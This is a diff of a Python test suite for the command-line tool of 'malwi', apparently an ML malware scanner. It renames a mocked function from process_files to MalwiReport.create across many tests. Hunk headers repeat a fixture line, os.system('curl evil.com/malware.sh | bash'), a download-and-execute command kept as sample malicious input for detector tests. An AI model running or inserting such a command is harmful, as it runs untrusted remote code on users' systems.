@@ -25,7 +25,7 @@ class TestBasicCLI:
 
         # Mock the models to avoid loading actual ML models
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.process_files") as mock_process:
+            with patch("cli.entry.MalwiReport.create") as mock_process:
                 # Create a mock report
                 from research.malwi_object import MalwiReport, MalwiObject
 
@@ -56,7 +56,7 @@ class TestBasicCLI:
                     with patch("cli.entry.result") as mock_result:
                         main()
 
-                        # Verify process_files was called correctly
+                        # Verify MalwiReport.create was called correctly
                         mock_process.assert_called_once_with(
                             input_path=test_file,
                             accepted_extensions=["py", "js", "mjs", "cjs"],
@@ -83,7 +83,7 @@ os.system('curl evil.com/malware.sh | bash')
 """)
 
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.process_files") as mock_process:
+            with patch("cli.entry.MalwiReport.create") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
 
                 # Create mock malicious object
@@ -129,7 +129,7 @@ os.system('curl evil.com/malware.sh | bash')
 
         for fmt in formats_to_test:
             with patch("cli.entry.MalwiObject.load_models_into_memory"):
-                with patch("cli.entry.process_files") as mock_process:
+                with patch("cli.entry.MalwiReport.create") as mock_process:
                     from research.malwi_object import MalwiReport, MalwiObject
 
                     mock_obj = MalwiObject(
@@ -192,7 +192,7 @@ os.system('curl evil.com/malware.sh | bash')
         output_file = tmp_path / "output.json"
 
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.process_files") as mock_process:
+            with patch("cli.entry.MalwiReport.create") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
 
                 mock_obj = MalwiObject(
@@ -251,7 +251,7 @@ os.system('curl evil.com/malware.sh | bash')
         (tmp_path / "readme.txt").write_text("This is a readme")  # Should be skipped
 
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.process_files") as mock_process:
+            with patch("cli.entry.MalwiReport.create") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
 
                 # Mock objects for each processed file
@@ -313,7 +313,7 @@ os.system('curl evil.com/malware.sh | bash')
         test_file.write_text("import subprocess")
 
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.process_files") as mock_process:
+            with patch("cli.entry.MalwiReport.create") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
 
                 mock_obj = MalwiObject(
@@ -370,7 +370,7 @@ os.system('curl evil.com/malware.sh | bash')
         (tmp_path / "test.js").write_text("console.log('js')")
 
         with patch("cli.entry.MalwiObject.load_models_into_memory"):
-            with patch("cli.entry.process_files") as mock_process:
+            with patch("cli.entry.MalwiReport.create") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
 
                 mock_report = MalwiReport(
@@ -416,7 +416,7 @@ os.system('curl evil.com/malware.sh | bash')
             "cli.entry.MalwiObject.load_models_into_memory",
             side_effect=Exception("Model loading failed"),
         ):
-            with patch("cli.entry.process_files") as mock_process:
+            with patch("cli.entry.MalwiReport.create") as mock_process:
                 from research.malwi_object import MalwiReport, MalwiObject
 
                 mock_obj = MalwiObject(
